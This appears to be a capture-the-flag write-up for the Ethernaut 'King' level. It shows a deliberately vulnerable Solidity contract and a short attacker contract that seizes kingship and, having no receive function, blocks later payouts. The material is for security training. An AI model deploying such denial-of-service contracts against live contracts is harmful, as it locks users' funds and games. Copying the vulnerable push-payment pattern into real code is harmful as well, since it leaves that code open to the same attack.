# King

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

```

## Solution

```
contract HackKing{

   function becomeKing (address payable _targetContract) public payable {
       (bool success, bytes memory returnData) =  _targetContract.call{value: msg.value}('');
    }
}

```

Provide the target contract address and pass the msg.value higher than the current prize.

### Hint from Ethernaut

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.